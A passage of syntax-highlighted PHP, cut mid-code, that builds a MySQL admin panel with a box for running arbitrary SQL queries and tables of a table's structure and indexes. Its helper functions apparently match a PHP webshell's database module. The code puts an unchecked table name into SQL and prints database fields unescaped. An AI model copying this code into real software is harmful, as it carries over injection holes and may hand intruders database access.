<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;p&gt;&lt;table width="200" border="0" cellpadding="0" cellspacing="0"&gt;</span><span style="color: #66cccc; text-decoration: underline;">&lt;tr&gt;&lt;td colspan="2"&gt;Run SQL query/queries on database '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">':&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;"&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">htmlspecialchars(</span><span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">sql_query</span><span style="text-decoration: underline;">,</span><span style="color: #6699cc; text-decoration: underline;">ENT_QUOTES</span><span style="text-decoration: underline;">).</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/textarea&gt;&lt;/td&gt;&lt;td style="padding:0 5px;"&gt;&lt;input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'tablename'</span>, $<span style="color: #ffcc66;">tablename</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'mysqladmin'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span>$<span style="color: #ffcc66;">dbform</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/form&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">tablename</span> || ($<span style="color: #ffcc66;">runquery</span> &amp;&amp; $<span style="color: #ffcc66;">sql_query</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">doing</span> == <span style="color: #66cccc;">'structure'</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">result</span> = <span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">"SHOW FULL COLUMNS FROM $tablename"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">rowdb</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">while</span>($<span style="color: #ffcc66;">row</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mysql_fetch_array(</span>$<span style="color: #ffcc66;">result</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">rowdb</span>[] = $<span style="color: #ffcc66;">row</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;h3&gt;Structure&lt;/h3&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Field&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Type&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Null&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Key&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Default&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Extra&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Privileges&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Comment&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/tr&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span> ($<span style="color: #ffcc66;">rowdb</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">row</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">thisbg</span> = <span style="color: #cccccc; background-color: #2d2d2d;">bg(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="'</span>.$<span style="color: #ffcc66;">thisbg</span>.<span style="color: #66cccc;">'" onmouseover="this.className=\</span><span style="color: #66cccc; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Field'</span>].<span style="color: #66cccc;">'&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Type'</span>].<span style="color: #66cccc;">'&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Collation'</span>].<span style="color: #66cccc;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Null'</span>].<span style="color: #66cccc;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Key'</span>].<span style="color: #66cccc;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Default'</span>].<span style="color: #66cccc;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Extra'</span>].<span style="color: #66cccc;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Privileges'</span>].<span style="color: #66cccc;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Comment'</span>].<span style="color: #66cccc;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/tr&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">tbfoot(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">result</span> = <span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">"SHOW INDEX FROM $tablename"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">rowdb</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">while</span>($<span style="color: #ffcc66;">row</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mysql_fetch_array(</span>$<span style="color: #ffcc66;">result</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">rowdb</span>[] = $<span style="color: #ffcc66;">row</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;h3&gt;Indexes&lt;/h3&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Keyname&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Type&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Unique&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Packed&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Seq_in_index&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Field&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Cardinality&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Null&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Comment&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/tr&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span> ($<span style="color: #ffcc66;">rowdb</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">row</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">thisbg</span> = <span style="color: #cccccc; background-color: #2d2d2d;">bg(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="'</span>.$<span style="color: #ffcc66;">thisbg</span>.<span style="color: #66cccc;">'" onmouseover="this.className=\</span><span style="color: #66cccc; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Key_name'</span>].<span style="color: #66cccc;">'&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Index_type'</span>].<span style="color: #66cccc;">'&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.($<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Non_unique'</span>] ? <span style="color: #66cccc;">'No'</span> : <span style="color: #66cccc;">'Yes'</span>).<span style="color: #66cccc;">'&amp;nbsp;&lt;/td</span><span style="color: #66cccc; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.($<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Packed'</span>] === <span style="color: #6699cc;">null</span> ? <span style="color: #66cccc;">'No'</span> : $<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Packed'</span><span style="text-decoration: underline;">]).</span><span style="color: #66cccc; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Seq_in_index'</span>].<span style="color: #66cccc;">'&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Column_name'</span>].($<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Sub_part'</span>] ? <span style="color: #66cccc;">'('</span>.$<span style="color: #ffcc66;">ro</span><span style="color: #ffcc66; text-decoration: underline;">w</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'Sub_part'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">')'</span><span style="text-decoration: underline;"> : </span><span style="color: #66cccc; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #66cccc; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.($<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Cardinality'</span>] ? $<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Cardinality'</span>] : <span style="color: #cccccc; background-color: #2d2d2d;">0</span>)<span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Collation'</span>].<span style="color: #66cccc;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Null'</span>].<span style="color: #66cccc;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">row</span>[<span style="color: #66cccc;">'Comment'</span>].<span style="color: #66cccc;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/tr&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">tbfoot(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">doing</span> == <span style="color: #66cccc;">'insert'</span> || $<span style="color: #ffcc66;">doing</span> == <span style="color: #66cccc;">'edit'</span>) {
